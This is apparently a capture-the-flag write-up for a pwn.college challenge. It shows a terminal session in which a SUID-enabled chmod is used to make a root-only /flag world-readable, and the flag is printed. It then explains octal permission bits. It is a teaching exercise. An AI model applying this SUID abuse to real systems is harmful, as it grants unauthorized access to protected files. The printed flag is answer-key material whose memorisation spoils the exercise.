`chmod` (change mode) is a command-line utility used in Unix-like OS to change the access permission of files and directories.

As the `SUID` bit has been set for the `chmod` , now we can change the access permission for the `flag` file.

```bash
hacker@program-misuse-level-38:~$ /challenge/babysuid_level38 
Welcome to /challenge/babysuid_level38!

This challenge is part of a series of programs that
let you get the flag by doing tricks with permissions.

I just set the SUID bit on /usr/bin/chmod.
Try to use it to read the flag!

IMPORTANT: make sure to run me (/challenge/babysuid_level38) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/chmod!
hacker@program-misuse-level-38:~$ ls -l /flag
-r-------- 1 root root 57 Jan  3 08:33 /flag
hacker@program-misuse-level-38:~$ chmod 777 /flag
hacker@program-misuse-level-38:~$ ls -l /flag
-rwxrwxrwx 1 root root 57 Jan  3 08:33 /flag
hacker@program-misuse-level-38:~$ cat /flag
pwn.college{ULVlzQrOAIjpRG3QT4urBU9CC-c.0FM4EDL0AjNzQzW}
```

We change the mode to `777` for the `flag` file. Here each `7` is for `file owner`, `group` and `other than the owner and the group `. The binary representation for `7` is `111` . Each bit represents `read`, `write`, `execute` and `1` means `{action} is permissible` . Here `action means {read, write, execute}` . That means `file owner`, `group`, `other than the owner and the group` have access to `read, write, execute`.

Let's take another example,  `755` means `file owner` has the permission to `read, write, execute`. `Group` has only access to `read` and `execute` as binary representation for `5` is `101`.
Same goes for `other than the owner and the group`.

Now we have the access to read the `flag` file. 